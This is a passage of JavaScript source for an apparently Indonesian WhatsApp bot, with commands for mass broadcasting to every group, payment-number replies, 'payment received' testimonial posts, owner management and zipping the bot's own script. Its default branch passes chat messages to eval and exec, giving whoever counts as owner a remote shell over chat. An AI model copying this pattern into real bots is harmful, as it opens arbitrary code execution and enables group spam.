const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await vynx.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await vynx.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await vynx.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: lol})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.dana}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await vynx.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ovo": {
if (!isCreator) return
let teks = `
*PAYMENT OVO ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.ovo}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await vynx.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gopay": {
if (!isCreator) return
let teks = `
*PAYMENT GOPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.gopay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await vynx.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shopepay": {
if (!isCreator) return
let teks = `
*PAYMENT SHOPEPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.shopepay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await vynx.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "toaudio": case "tovn": {
if (!/video|mp4/.test(mime)) return m.reply(example("dengan reply/kirim vidio"))
const vid = await vynx.downloadAndSaveMediaMessage(qmsg)
const result = await toAudio(fs.readFileSync(vid), "mp4")
await vynx.sendMessage(m.chat, { audio: result, mimetype: "audio/mpeg", ptt: /tovn/.test(command) ? true : false }, { quoted: m })
await fs.unlinkSync(vid)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await vynx.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: lol})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linksaluran}

*Marketplace :*
${linkGrup}`
await vynx.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: lol})
}
break


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "save": case "sv": {
if (!isCreator) return
await vynx.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "self": {
if (!isCreator) return
vynx.public = false
payreply("Berhasil mengganti ke mode *self*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "getcase": {
if (!isCreator) return Reply(mess.owner);
if (!text) return m.reply(example("menu"));
const getcase = (cases) => {
const fileContent = fs.readFileSync('./depay.js').toString();
const caseRegex = new RegExp(`case ['"]${cases}['"]`, 'i'); // Pencarian case dengan tanda ' atau "
const match = fileContent.split(caseRegex);
if (match.length < 2) throw new Error("Case not found");
return "case " + `'${cases}'` + match[1].split("break")[0] + "break";
};
try {
reply(`${getcase(q)}`);
} catch (e) {
return m.reply(`Case *${text}* Tidak Ditemukan`);
}
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}
*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await payreply(respon)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "public": {
if (!isCreator) return
vynx.public = true
payreply("Berhasil mengganti ke mode *public*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya"))
await vynx.sendMessage(idSaluran, {text: text})
payreply("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upchannel2": case "upch2": {
if (!isCreator) return payreply(mess.owner)
if (!text) return m.reply(example("teksnya dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan mengirim foto"))
let img = await vynx.downloadAndSaveMediaMessage(qmsg)
await vynx.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})
payreply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getsc": {
if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return payreply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Wait.....")
var name = `𝗦𝘂𝗽𝗲𝗿𝗦𝗼𝗻𝗶𝗰 𝗩𝟯 By Vynx`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await vynx.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return payreply("Script bot berhasil dikirim ke private chat")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetdb": case "rstdb": {
if (!isCreator) return payreply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
payreply("Berhasil mereset database ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "setppbot": {
if (!isCreator) return payreply(mess.owner)
if (/image/g.test(mime)) {
var medis = await vynx.downloadAndSaveMediaMessage(qmsg)
if (args[0] && args[0] == "panjang") {
const { img } = await generateProfilePicture(medis)
await vynx.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
payreply("Berhasil mengganti foto profil bot ✅")
} else {
await vynx.updateProfilePicture(botNumber, {content: medis})
await fs.unlinkSync(medis)
payreply("Berhasil mengganti foto profil bot ✅")
}
} else return payreply(example('dengan mengirim foto'))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clearchat": case "clc": {
if (!isCreator) return payreply(mess.owner)
vynx.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listowner": case "listown": {
if (owners.length < 1) return payreply("Tidak ada owner tambahan")
let teks = `\n *List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
vynx.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: lol})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delowner": case "delown": {
if (!isCreator) return payreply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return payreply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return payreply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
payreply(`Berhasil menghapus owner ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addowner": case "addown": {
if (!isCreator) return payreply(mess.owner)
if (!m.quoted && !text) return payreply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return payreply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
payreply(`Berhasil menambah owner ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (m.text.toLowerCase() == "bot") {
payreply("Oi Ape Bos")
}

if (m.text.toLowerCase() == "woi bot") {
payreply("napa? ")
}

if (m.text.toLowerCase() == "p") {
payreply("Uy, Owner Lagi Off,ini yang bales Bot Tunggu aja yak,Tar Bakal Cepet On dah")
}

if (m.text.toLowerCase() == "sayang") {
payreply("Iya ayy >< ")
}

if (m.text.toLowerCase() == "yang") {
m.reply("iyaa ayy >< ")
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
}
} catch (err) {
console.log(util.format(err));
let Obj = global.owner
vynx.sendMessage(Obj + "@s.whatsapp.net", {text: `*Hallo developer, telah terjadi error pada command :* ${isCmd ? prefix+command : m.text}

*Detail informasi error :*
${util.format(err)}`, contextInfo: { isForwarded: true }}, {quoted: m})
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});